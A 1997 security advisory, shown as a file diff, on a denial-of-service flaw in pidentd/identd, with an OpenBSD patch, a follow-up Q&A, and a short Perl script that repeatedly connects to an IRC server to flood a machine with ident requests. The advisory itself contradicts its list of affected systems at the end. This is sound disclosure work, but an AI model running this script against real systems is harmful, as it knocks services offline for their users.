@@ -1,0 +1,108 @@
+
+ ************** Corinne Posse Security Notice  **************
+Issue Number 8: 970803
+    **************  http://posse.cpio.org  **************
+
+**** Denial of Service care of identd ****
+
+A massive amount of authorization requests to identd (pidentd and others)
+can cause system load to skyrocket, making the system unusable.
+
+Affected Sites:
+FreeBSD, NetBSD, Linux, SCO, Solaris, IRIX, and OpenBSD prior to 8/1/97.
+ANY system running pidentd.
+
+Problem:
+A massive amount of ident requests causes the identd daemon to "spin"
+because the daemon does not correctly close the socket from the host
+that issues a request. This is due to a poorly implemented incantation
+of wait(). The improper code perpetuates the identd process and allows
+the process to hang, slowing system performance considerably. On average,
+2-3 spinning processes slow the system noticeably-- 10-15 make the system
+unusable. Bear in mind that this is all based on the speed of the system
+and the above numbers hold true for machines like a p5/100 with 32M of RAM.
+Simply "kill -9 (ident's PIDs)" fixes the problem if it occurs.
+
+Fix:
+Thanks to Theo de Raadt of the OpenBSD project, we are proud to announce
+that OpenBSD has fixed this problem, and that the following patches
+are available. OpenBSD uses a modified version of pidentd.
+
+Index: libexec/identd/identd.c
+===================================================================
+RCS file: /cvs/src/libexec/identd/identd.c,v
+retrieving revision 1.4
+retrieving revision 1.5
+diff -r1.4 -r1.5
+2c2
+< **    $Id: identd.c,v 1.4 1997/07/23 20:36:27 kstailey Exp $
+---
+> **    $Id: identd.c,v 1.5 1997/07/29 07:49:31 deraadt Exp $
+180a181
+>   int save_errno = errno;
+184a186
+>   errno = save_errno;
+
+Exploit:
+This problem was discovered simultaneously by Jack0 as well as Jonathan
+Katz. Jack0 noticed that a user's repeated requests to an IRC server
+spawned many identd processes on his local machine, bringing his box to a crawl.
+Jon noticed that after someone sent email to the various mailing lists he
+runs, the many hosts receiving the mail would make ident requests and
+leave his system paralyzed. To see if your system is vulnerable, Jack0
+has come up with a PERL script that repeatedly tries to connect to an
+IRC server. With a little tinkering, the script can be used to adapt to
+a variety of different services if you want or need to test other services.
+
+#!/usr/bin/perl
+# Ident abuse script which can be used to test for the identd vulnerability
+# on the local system.
+# jack0@cpio.org for questions
+
+#include <Socket.pm>
+use Socket;
+my($h,$p,$in_addr,$proto,$addr);
+$h = "$ARGV[0]";
+$p = 6667 if (!$ARGV[1]);
+if (!$h) {
+  print "Host name most be specified i.e.,; some.server.net\n";
+}
+$in_addr = (gethostbyname($h))[4];
+$addr = sockaddr_in($p,$in_addr);
+$proto = getprotobyname('tcp');
+&connect;
+
+sub connect {
+  print "Connection in progress:\n";
+  socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;
+  connect(S,$addr) or die $!;
+  select S;
+  $| = 1;
+  print "QUIT\n";
+  select STDOUT;
+  close S;
+  &connect;
+}
+
+
+===========================================================================
+
+
+> Does this still apply when identd is called from inetd.conf wait -w -t120
+> or run in daemon mode?
+
+This occurs when ident is being called from inetd-- with ANY "-w" time
+alotted. The OpenBSD default is -w60 or -w120, I tested it at -w40 and
+other settings.
+
+
+===========================================================================
+
+This patch is now incorporated into the main Pidentd distribution
+as of version 2.8a4 now available on:
+
+        ftp://ftp.lysator.liu.se/pub/ident/servers/pidentd-2.8a4.tar.gz
+
+(Btw, this bug did not affect HP-UX, SVR4 (Solaris et al), IRIX, UNICOS,
+A/UX, SCO or Linux since they support the "signal(SIGCHLD, SIG_IGN)"
+way of automatically disposing of dead children.)
